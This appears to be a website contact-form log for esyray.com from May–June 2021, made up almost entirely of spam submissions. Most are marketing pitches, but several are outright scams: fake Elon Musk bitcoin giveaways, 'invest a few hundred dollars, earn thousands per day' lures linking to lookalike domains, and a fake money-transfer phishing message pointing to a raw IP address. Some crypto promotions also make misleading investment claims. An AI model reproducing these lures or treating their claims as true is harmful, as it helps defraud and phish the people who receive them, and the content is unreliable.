CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-05-17 05:24:58 AM -- Email from: Chastity Kleeman, -- subject: chastity.kleeman14@gmail.com, -- email: chastity.kleeman14@gmail.com, -- Message is: Your Ad Promoted to ​1000's+ Advertising Sites Each Month Automatically! Check it out: http://bit.ly/unlimited-web-traffic-here
+++ 2021-05-17 11:49:32 AM -- Email from: Eva Amiet, -- subject: What is Buddhism? This is a way of life and not a religion. Free yourself from sufferings, -- email: eva.amiet@gmail.com, -- Message is: Hi,

Many have the misconception of Buddhism being a religion. Buddhism is really more of a way of life whch can wired our brains positively and see changes in a different light.

Since fate has brough us here, we hope you can spend some time to explore Buddhism.

We have shortlisted a few videos from youtube with regards to Buddhism, we believe your time will not be wasted:

Check out the videos in youtube here:

What is Buddhism?
https://bit.ly/3olo410

Basic of Buddhism by Patrick Goodness in youtube:
https://bit.ly/3waxT4D

Albert Einstein on Buddhism - what Albert Einstein thought about Buddhism:
https://bit.ly/3ypqr7V

Bertrand Russell (Nobel Prize Winner) on Buddha and Buddhism
https://bit.ly/3fmvk91

There is a great deal of quality content in Youtube regarding Buddhism and how it can alleviate sufferings. During this trying times, we hope the above can help you! If you find this useful, please share with your friends!
+++ 2021-05-18 05:21:23 AM -- Email from: Joshuaionit, -- subject: Elon Musk 5,000 BTC Giveaway!, -- email: jj123@yahoo.com, -- Message is: Elon Musk 5,000 BTC Giveaway! 
Due to the fact that Tesla has stopped selling cars for Bitcoins. 
Elon Musk decided to distribute 5,000 Bitcoins per week for a month. 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1PsE1&amp;sa=D&amp;Sp=Ka&amp;usg=AFQjCNGCUIRa4fS6cDrEAZvz_5ew1ySmpQ 
More than 500 people have already taken part in this action and they received the promised bitcoins from Elon Musk. 
Hurry up, otherwise you may not be enough ... 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1PsE1&amp;sa=D&amp;Do=Jh&amp;usg=AFQjCNGCUIRa4fS6cDrEAZvz_5ew1ySmpQ
+++ 2021-05-18 09:53:47 AM -- Email from: Ashley McNeel, -- subject: Important Reminder, -- email: ashely@thevoicedirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://thevoicedirectory.link/abcc1/?=esyray.com


Ashley
Voice Activation Follow-up Specialist
The Voice Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://thevoicedirectory.link/out.php?site=esyray.com
+++ 2021-05-18 04:19:43 PM -- Email from: Andy Burns, -- subject: Quick question, -- email: andyburns@cyberservices.com, -- Message is: Dear Business owner,

Get Access to Millions of Low Priced Business Products.

Start Saving Here &gt; http://www.businessproducts.club

Save Money / Lower Costs / Simple Purchasing

Andy Burns
Regional Manager
+++ 2021-05-19 06:35:15 AM -- Email from: Jay McDonald, -- subject: Jay from MySalesWriter, -- email: jayson+m3@mysalesscripter.com, -- Message is: Hi there,

I hope I am not troubling you. My name is Jay and I work at Mysalesscripter.com.

I’m writing to you because I found your site: esyray.com on bing and was wondering if you are interested in a completely FREE fill in the blanks professional sales letter template you can use to generate new business straight away? If you are not the person to contact I would be very grateful if you could pass this message to them.

In addition to the sales letter template, here are some of the custom sales scripts I create:

1. Custom Sales Letters for your Product or Service to Sell Like Hot Cakes

2. Full Email Series to Establish Your Client Relationships and Maximise Sales

3. Sales Phone Call Scripts to Hit Your Sales Targets 

4. Crazy Converting Website Sales Copy 

5. Attention Grabbing Adwords and Facebook Ads

6. Slick, Memorable Video Sales Letters

7. Lead Grabbing Optin Pages and Sales Boosting Upsell Scripts

8. Professional Webinar Presentations and Webinar Promotion Material

9. Attention Getting Headlines and Call to Actions (CTA)

10. Complete Product Follow up Email Series

11. Blog content creation and management 

12. Ebook creation

To get your awesome, completely FREE, battle tested, fill in the blanks sales letter template - fuelling user engagement and generating sales - go to Mysalesscripter.com now.

This is a great risk free opportunity to test us out and take your business to the next level. Imagine the ROI if your completely FREE, professional sales letter template generates just two additional sales. 

Please go to Mysalesscripter.com now.

Kind regards,

Jay McDonald
Jayson@Mysalesscripter.com 

Sales Script Superstar at https://Mysalesscripter.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/m?d=esyray.com
+++ 2021-05-20 08:54:18 AM -- Email from: Mike Sykes, -- subject: affordable monthly SEO plans, -- email: no-reply@google.com, -- Message is: Howdy 
 
I have just verified your SEO on  esyray.com for its SEO Trend and saw that your website could use a push. 
 
We will enhance your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our services below, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start increasing your sales and leads with us, today! 
 
regards 
Mike Sykes
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-05-20 10:59:43 AM -- Email from: Ashton Moniz, -- subject: What is Buddhism? This is a way of life and not a religion. Free yourself from sufferings, -- email: ashton.moniz@googlemail.com, -- Message is: Hi,

Many have the misconception of Buddhism being a religion. Buddhism is really more of a way of life whch can wired our brains positively and see changes in a different light.

Since fate has brough us here, we hope you can spend some time to explore Buddhism.

We have shortlisted a few videos from youtube with regards to Buddhism, we believe your time will not be wasted:

Check out the videos in youtube here:

What is Buddhism?
https://bit.ly/3olo410

Basic of Buddhism by Patrick Goodness in youtube:
https://bit.ly/3waxT4D

Albert Einstein on Buddhism - what Albert Einstein thought about Buddhism:
https://bit.ly/3ypqr7V

Bertrand Russell (Nobel Prize Winner) on Buddha and Buddhism
https://bit.ly/3fmvk91

There is a great deal of quality content in Youtube regarding Buddhism and how it can alleviate sufferings. During this trying times, we hope the above can help you! If you find this useful, please share with your friends!
+++ 2021-05-21 08:30:16 AM -- Email from: Zack Joe, -- subject: What is Buddhism? This is a way of life and not a religion. Free yourself from sufferings, -- email: joe.zack@gmail.com, -- Message is: Hi,

Many have the misconception of Buddhism being a religion. Buddhism is really more of a way of life whch can wired our brains positively and see changes in a different light.

Since fate has brough us here, we hope you can spend some time to explore Buddhism.

We have shortlisted a few videos from youtube with regards to Buddhism, we believe your time will not be wasted:

Check out the videos in youtube here:

What is Buddhism?
https://bit.ly/3olo410

Basic of Buddhism by Patrick Goodness in youtube:
https://bit.ly/3waxT4D

Albert Einstein on Buddhism - what Albert Einstein thought about Buddhism:
https://bit.ly/3ypqr7V

Bertrand Russell (Nobel Prize Winner) on Buddha and Buddhism
https://bit.ly/3fmvk91

There is a great deal of quality content in Youtube regarding Buddhism and how it can alleviate sufferings. During this trying times, we hope the above can help you! If you find this useful, please share with your friends!
+++ 2021-05-21 01:15:14 PM -- Email from: JamesAcemn, -- subject: What is your attitude towards rich people? Invest $ 296 and get passive income of $ 9200 per day, -- email: heolonelygirl@yahoo.ca, -- Message is: The strategy of big profit: where and how. Invest $ 589 and get passive income of $ 6100 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1PsE1&amp;sa=D&amp;Dt=Sf&amp;usg=AFQjCNGCUIRa4fS6cDrEAZvz_5ew1ySmpQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-05-21 02:45:30 PM -- Email from: Joey Newman, -- subject: trying to connect, -- email: joey+newman2@myblogposters.com, -- Message is: Hi,

I'm Joey from MyBlogPosters.com.

After years of providing professional blog writing and other copy material, I have recently launched my own site. My mission is to write engaging blog posts to help start ups and small businesses build credibility, providing quality and value, at an affordable level.

Blog post templates

The “How to” Blog Post

The “Tips” Blog Post

The “FAQ” Blog Post

The “Resources” Blog Post

The “Top Mistakes” Blog Post

The “Rant” Blog Post

The “Encyclopedia” Blog Post

The “Promotional” Blog Post

The “Press Release” Blog Post

The “Motivational” Blog Post

The “News” Blog Post

The “SEO” Blog Post

The “How To” Blog Post

The “Product Review” Blog Post

The “Tips” Blog Post

The “List” Blog Post

The “FAQ” Blog Post

The “Case Study” Blog Post

The “Instructional” Blog Post

The “Multi-Part” Blog Post

The “Critical” Blog Post

The “Greatest Hits” Blog Post

The “Response” Blog Post

The “Groundbreaking” Blog Post

The “Product Comparison” Blog Post

The “Promotional” Blog Post

To provide value for you for free I am currently giving away 26 professional level blog post templates (worth $297).

Very easily you can spend a few minutes editing one of the templates and get a high quality, well structured engaging post your audience will love. 

If this is of interest to you, please visit https://myblogposters.com/ where you can grab your 26 free blog post templates now. 

Thanks for your time. 

Best regards
Joey Newman

joey@myblogposters.com

Article Artist  at https://myblogposters.com/

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/mbp?d=esyray.com
+++ 2021-05-21 08:25:02 PM -- Email from: Lara Gorton, -- subject: Important, -- email: lara@bizvideo.link, -- Message is: Hey, great site!

Have you thought about adding a video in response to COVID-19?

We can make one for you: 
https://www.bizvideo.link/success/?=esyray.com

Customers are worried right now. A short video like this can make a big impact for your business in the long term. People will remember it!

Be well,
Lara

P.S. Due to coronavirus, we have also lowered our prices by up to 55%. 






- This commercial message sent from PJLK Marketing LC
410 E Santa Clara Street STE 817
San Jose, CA 95113

To unsubscribe click here:
https://bizvideo.link/out.php/?site=esyray.com
+++ 2021-05-22 08:00:27 PM -- Email from: Jan Truesdale, -- subject: , -- email: jan.truesdale@gmail.com, -- Message is: Are visitors to your site starting to dry up? Don't worry, it happens to everyone sooner or later. It could be that Google tweaked their algorithm or your competition has found a way to move up higher in the search results for your keywords. We have a solution for this. We can post ads for your site on thousands of high traffic shopping sites which will not only generate sales and leads for you but also boost your off-site SEO and improve your Google rank. More details here: http://www.unlimitedtrafficforyoursite.xyz
+++ 2021-05-24 04:35:45 AM -- Email from: JamesAcemn, -- subject: The strategy of big profit: where and how. Invest $ 375 and get passive income of $ 9900 per day, -- email: heartalmonda28@yahoo.ca, -- Message is: &quot;Forget about a rent and debts!&quot; Invest $ 656 and get passive income of $ 9200 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1PsE1&amp;sa=D&amp;Du=Kt&amp;usg=AFQjCNGCUIRa4fS6cDrEAZvz_5ew1ySmpQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-05-24 03:05:22 PM -- Email from: Patricia, -- subject: Let's go, meet girls, right now!, -- email: patricianyjohnson@gmail.com, -- Message is: Finding a hookup in your city used to be an ordeal. You might have relied on personal ads or expensive online dating sites. Lucky for all of us, these days it's easy to find free hookup...
Click here to read more: https://bit.ly/349eFjT

Have a GREAT day,
Patricia
+++ 2021-05-25 10:51:24 AM -- Email from: Beulah Havens, -- subject: Bitcoin crashed more than 50%, what's next?, -- email: havens.beulah@msn.com, -- Message is: The bitcoin price, after nudging $65,000 per bitcoin in April, dropped to just under $30,000 this week before rebounding slightly.

If you have been considering to buy bitcoins but found it too expensive, your chance to buy bitcoin at 50% off is here!

The SEC in the US classifies Bitcoin as a digital asset and Bitcoin is here to stay. If you fear Bitcoin's price going down, please take a look at Bitcoin's chart over the last 10 years, each time it crashes 50%, it has always gone on to make new all time high!

And Bitcoin is not the only cryptocurrency on discount! Most cryptos are down in prices too!

If you want profits, we buy when prices are low and sell when prices are high!

Sure, cryptos might drop a little more from current prices, and if you are new, you can buying a little cryptocurrency over a few days or weeks by using the dollar cost averaging method.

For example, instead of buying $1000 worth of cryptocurrencies in a single day, buy $100 per day over 10 days. In this way you can get a good average price.



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-05-27 08:05:39 PM -- Email from: Kimberly Bradly, -- subject: quick question, -- email: kimberly+brad2@fixhacksite.com, -- Message is: Hello,

I'm sorry to trouble you. Would you be so kind as to tell me who is responsible for website optimization and security for esyray.com and how I might get in touch with them?

I have performed a  web site optimisation  as well as a  speed audit on your  website esyray.com, if you would like the findings please  head over to fixhacksite.com  &amp;  pick 25 point  complimentary website security and  load speed audit and I will  send it over to you.

Thank you

Kind regards
Kim Bradley
Kimberly@fixhacksite.com

Website Protector at  Https://fixhacksite.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/f?d=esyray.com
+++ 2021-05-28 12:23:25 AM -- Email from: Cherie Petherick, -- subject: Your Twitter Retweets for esyray.com, -- email: petherick.cherie81@yahoo.com, -- Message is: Good morning - esyray.com, 

Let's start with a straightforward fact: Social media plays a vital role with your brand's online success. Moreover, should you be doing SEO, you should be thinking about social networking also. Having your site shared about the most favored social networks is vital that will help you increase visibility on search engines like google.
Check what we can do for you: 
https://business-it-services.com/socialsignals
Sincerely,

P.S. We offer the very best marketing services you can order on our online shop for making big money in a small business, still not thinking about getting new clients? Here is a quick, 1-click unsubscribe link: https://business-it-services.com/?unsubscribe=esyray.com
+++ 2021-05-28 04:38:03 PM -- Email from: JamesAcemn, -- subject: You don`t need to go to work daily anymore! Invest $ 658 and get passive income of $ 5200 per day, -- email: adilbelkaid@hotmail.fr, -- Message is: Get everything you wanted for a long time! Invest $ 658 and get passive income of $ 6900 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc2iVZz&amp;sa=D&amp;Mu=Fh&amp;usg=AFQjCNFJ6DQ-GgLJiqgZRHHBoeSsdUCiIw   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-05-28 08:57:49 PM -- Email from: Nick Jones, -- subject: Can you direct me to the right person, -- email: nick@saaytext.com, -- Message is: Greetings, No one answers the phone anymore so SaayText has a fully Unlimited Texting tool for your business to communicate with customers and leads. 
 
It's 49/mo flat, all you can send no other costs. 
 
You can text your WHOLE LIST at once using the bulk send feature or send TWO WAY texts and get replies with Peer to Peer texting. 
 
Check it out @ http://SaayText.com 
 
Thanks 
Nick
+++ 2021-05-29 03:26:25 AM -- Email from: Abdul Marmion, -- subject: , -- email: marmion.abdul76@gmail.com, -- Message is: Did you know that there are easier and FREE ways to drive traffic back to your site other than Google and Facebook? The internet is a vast ocean and there are many smaller but high traffic sites out there that you could be leveraging to get free traffic right now! Here are 5 sites where you can do just that, check it out: http://www.freetrafficwebsites.click
+++ 2021-05-29 10:56:49 AM -- Email from: Delia Keller, -- subject: Bitcoin crashed more than 50%, what's next?, -- email: keller.delia@yahoo.com, -- Message is: The bitcoin price, after nudging $65,000 per bitcoin in April, dropped to just under $30,000 this week before rebounding slightly.

If you have been considering to buy bitcoins but found it too expensive, your chance to buy bitcoin at 50% off is here!

The SEC in the US classifies Bitcoin as a digital asset and Bitcoin is here to stay. If you fear Bitcoin's price going down, please take a look at Bitcoin's chart over the last 10 years, each time it crashes 50%, it has always gone on to make new all time high!

And Bitcoin is not the only cryptocurrency on discount! Most cryptos are down in prices too!

If you want profits, we buy when prices are low and sell when prices are high!

Sure, cryptos might drop a little more from current prices, and if you are new, you can buying a little cryptocurrency over a few days or weeks by using the dollar cost averaging method.

For example, instead of buying $1000 worth of cryptocurrencies in a single day, buy $100 per day over 10 days. In this way you can get a good average price.



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-05-29 04:50:03 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-05-30 12:26:03 AM -- Email from: Lona Bromilow, -- subject: Make Delicious African Soups Like a Pro in your own kitchen!, -- email: lona.bromilow@gmail.com, -- Message is: Hello esyray.com

Make Delicious African Soups Like a Pro in your own kitchen!

Indulge in becoming an expert at creating various and flavorful forms of Ghanaian Soups using tasty ingredients such as Tomatoes, Peanuts, Spinach, and more, through easy-to-follow cookbooks! 

Browse Our Books   https://zeep.ly/bLjg1

Thanks, Lona Bromilow
If you no longer wish to hear from us, please reply to this email.
+++ 2021-05-30 08:26:50 AM -- Email from: Eddy Jeffcott, -- subject: Bitcoin crashed more than 50%, what's next?, -- email: eddy.jeffcott@outlook.com, -- Message is: The bitcoin price, after nudging $65,000 per bitcoin in April, dropped to just under $30,000 this week before rebounding slightly.

If you have been considering to buy bitcoins but found it too expensive, your chance to buy bitcoin at 50% off is here!

The SEC in the US classifies Bitcoin as a digital asset and Bitcoin is here to stay. If you fear Bitcoin's price going down, please take a look at Bitcoin's chart over the last 10 years, each time it crashes 50%, it has always gone on to make new all time high!

And Bitcoin is not the only cryptocurrency on discount! Most cryptos are down in prices too!

If you want profits, we buy when prices are low and sell when prices are high!

Sure, cryptos might drop a little more from current prices, and if you are new, you can buying a little cryptocurrency over a few days or weeks by using the dollar cost averaging method.

For example, instead of buying $1000 worth of cryptocurrencies in a single day, buy $100 per day over 10 days. In this way you can get a good average price.



If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-05-30 03:07:36 PM -- Email from: Meredith Symons, -- subject: esyray.com page speed is a critical factor., -- email: symons.meredith@outlook.com, -- Message is: Everyone wants better organic rankings and maximum visibility. Few realize that optimal user experience is a big part of getting there. Improve your visitors experience by making esyray.com run faster:
https://superb-marketing.com/speedup
With best regards,

P.S. We offer the most effective IT services you can purchase on our online shop for making big money in a small business, still not interested in getting clients? Here is a quick, 1-click unsubscribe link: https://superb-marketing.com/?unsubscribe=esyray.com
+++ 2021-05-31 01:56:22 AM -- Email from: JamesAcemn, -- subject: I invested 5 Bitcoins and after 5 minutes I received 10 Bitcoins from Tesla, -- email: lovemuff69@yahoo.fr, -- Message is: I invested 5 Bitcoins and after 5 minutes I received 10 Bitcoins from Elon Musk   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  http://www.medium.com.ministeriomfef.org/bitcoin?7510   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-05-31 10:07:58 AM -- Email from: Eric Jones, -- subject: Your site – more leads?, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hey, this is Eric and I ran across esyray.com a few minutes ago.

Looks great… but now what?

By that I mean, when someone like me finds your website – either through Search or just bouncing around – what happens next?  Do you get a lot of leads from your site, or at least enough to make you happy?

Honestly, most business websites fall a bit short when it comes to generating paying customers. Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment.

Here’s an idea…
 
How about making it really EASY for every visitor who shows up to get a personal phone call you as soon as they hit your site…
 
You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

You’ll be amazed - the difference between contacting someone within 5 minutes versus a half-hour or more later could increase your results 100-fold.

It gets even better… once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation.
  
That way, even if you don’t close a deal right away, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Pretty sweet – AND effective.

CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-05-31 11:40:02 PM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@alexabusinessdirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://alexabusinessdirectory.link/abcc1/?=esyray.com


 

 
Francis















 
2764 Pleasant Road Suite        Suite A PMB 708        Fort Mill        SC        29708

You can skip future marketing messages here:
https://alexabusinessdirectory.link/out.php?site=esyray.com
+++ 2021-06-01 01:19:18 PM -- Email from: Michelle Granger, -- subject: Uncertain times, -- email: michelle@marketingvideo.link, -- Message is: Hi – I hope you and your family are doing well!

Could your business benefit from a custom-made video right now?

Here's how we can help:
https://www.marketingvideo.link/success/?=esyray.com


It's a very effective way to convert new customers, especially during these uncertain times!

Be well,
Michelle








- This commercial message sent from PJLK Marketing LC
410 E Santa Clara St. RBLD#817
San Jose, CA 95113

To unsubscribe click here:
https://marketingvideo.link/out.php/?site=esyray.com
+++ 2021-06-02 03:37:02 AM -- Email from: JamesAcemn, -- subject: Hands down the quickest way to make a big capital. Invest $ 398 and get passive income of $ 8300 per day, -- email: tenderheart369cla@orange.fr, -- Message is: How to be financially independent and stand firmly on your feet? Invest $ 297 and get passive income of $ 3300 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  http://www.amazon.com.myclients.biz/blog?910   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-03 07:08:33 AM -- Email from: Mike Allford, -- subject: Increase Domain Strength for esyray.com, -- email: see-email-in-message@monkeydigital.co, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a DA between 50 to 60 points in Moz with us today and rip the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-DR50-UR70/ 
 
 
thank you 
Mike Allford
 
support@monkeydigital.co
+++ 2021-06-04 03:55:08 AM -- Email from: JamesAcemn, -- subject: What is your attitude towards rich people? Invest $ 595 and get passive income of $ 9500 per day, -- email: yohan.o@hotmail.fr, -- Message is: For a comfortable life, you need to take just a couple of steps: Invest $ 450 and get passive income of $ 9500 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  http://www.youtube.com.fatphillys.net/news?532   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-05 08:25:28 AM -- Email from: JamesAcemn, -- subject: The digital world: its advantages for revenue. Invest $ 588 and get passive income of $ 3300 per day, -- email: viviane-sab@hotmail.fr, -- Message is: &quot;Forget about a rent and debts!&quot; Invest $ 358 and get passive income of $ 9900 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  http://www.medium.com.myclients.biz/300000eur?382   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-05 08:53:09 AM -- Email from: Abraham Colley, -- subject: Invest in % domain %. When you do this, you press the fast-forward button on your success., -- email: colley.abraham@outlook.com, -- Message is: Good Afternoon
Hope you’re great, and that the company is profitable. Please allow me to introduce to you this service that you may find useful for your business.
The only service you'll need to get your web site to the top.
https://geeks-marketing.com
Sincerely,

P.S. We offer the top marketing services you can find on our shop for making big money in a small business, still not considering getting new business? Here is a simple, 1-click unsubscribe link: https://geeks-marketing.com/?unsubscribe=esyray.com
+++ 2021-06-06 06:23:55 AM -- Email from: Marcobep, -- subject: You received a money transfer of $ 89.44!, -- email: ahmedkirillov5@gmail.com, -- Message is: You received a money transfer of $ 89.44! PREPAYMENT! To receive funds, go to the payment page 
&lt;a href=http://5.79.219.166:8080/work/drac/&gt;Detail&lt;/a&gt;:  Official bank site/url]  Official bank site &lt;a href=&quot;http://5.79.219.166:8080/work/drac/&quot;&gt;Official bank site&lt;/a&gt;
+++ 2021-06-06 07:22:52 PM -- Email from: Marion, -- subject: Angelena, -- email: tbassim.alamalc@jncylp.com, -- Message is: Learn how to build a profitable affiliate marketing business by selling other people’s products! Tap into your share of a $12+ billion business model. Read More about it here: http://bit.ly/start-your-own-successful-affiliate-marketing-business
+++ 2021-06-07 10:54:13 AM -- Email from: JamesAcemn, -- subject: What is your attitude towards rich people? Invest $ 685 and get passive income of $ 3800 per day, -- email: sofianen3_aze@hotmail.fr, -- Message is: Acquiring financial independence. Invest $ 597 and get passive income of $ 8000 per day   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1PsE1&amp;sa=D&amp;La=Sr&amp;usg=AFQjCNGCUIRa4fS6cDrEAZvz_5ew1ySmpQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-06-08 04:47:02 PM -- Email from: Moises Lilly, -- subject: Cute puppy coin Shiba Inu is on 85% discount, -- email: lilly.moises@googlemail.com, -- Message is: The world was focusing on Doge Coin after Elon Musk tweeted that he owns Doge coin.

Do you know there is another cryptocurrency - Shi Inbu Coin is that down 85% from its top earlier?

Crypto currencies are volatile and big fortune (and losses) can be made within weeks or months.

With Shi Inu at such low prices, you can consider buying some at Binance (https://bit.ly/33yXOqz)

Go to this url and simply sign up with your email and password and enjoy 10% off your trading fees for life!  -&gt;https://bit.ly/33yXOqz


If you want to take advantage of the crazy discounts now, you can buy cryptocurrecncies at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-06-08 07:35:08 PM -- Email from: , -- subject: , -- email: team@bark.com, -- Message is: Hi,

Dale has just asked us to help them find a quality Electrician in Plano, TX, 75023.

We’re now contacting local professionals on their behalf, and if you respond quickly there’s a strong chance you’ll secure the business. It’s free to do so, and there’s no obligation to continue using our service in future.

A maximum of 5 professionals can contact Dale, so be quick!

Take a look at Dale’s request below and, if you can help, click the following link to contact them directly.

Contact Dale now: https://www.bark.com/find-work/united-states/plano-tx-75023/electricians/5c58da57/p38704998/
                   
Client details:

Dale
Electricians - Plano, TX, 75023
Dale has made their phone number available. We will make it available to you when you send your first message.

Project details:

What kind of work do you need doing?: Switch or outlet install

What kind of switch or outlet installation is this?: Install three outlets.  2 where direct wired appliances are, one new. 

How many switches or outlets is this for?: 3 switches or outlets

Is there already wiring in the desired location?: Two have existing wiring, one does not - but it is above an existing outlet. 

Which type(s) of room is this for?: Rooms with water e.g. kitchen, bathroom

Who will purchase the switches/outlets?: I would like to discuss this with the pro

What type of property is this for?: House

When do you want the work done?: As soon as possible

Additional Details: I need three outlets installed.  Two are for kitchen appliances,  where previously the appliances were direct wired.  One is 220 and needs to be 110.  The third outlet is new and is above an existing outlet (basically raising the outlet up)



Reply now: https://www.bark.com/find-work/united-states/plano-tx-75023/electricians/5c58da57/p38704998/

What is Bark?
Bark is a lead generation service. Customers tell us what they’re looking for and we put them in touch with great companies like yours to help get the job done.

Join today and you’ll be able to contact your first customer on us. After that, there’s no commission, no monthly fee – and everything you make with us is yours to keep.

We’ll send you information about new customers for free, and you can simply pick and choose the ones that work best for you.

Why have we contacted you?
We believe your company can help Dale with their project, and we’d like to put you two in touch.

They’ve asked us to find a great local Electrician, and if you respond right away there’s a strong chance you’ll secure the business.

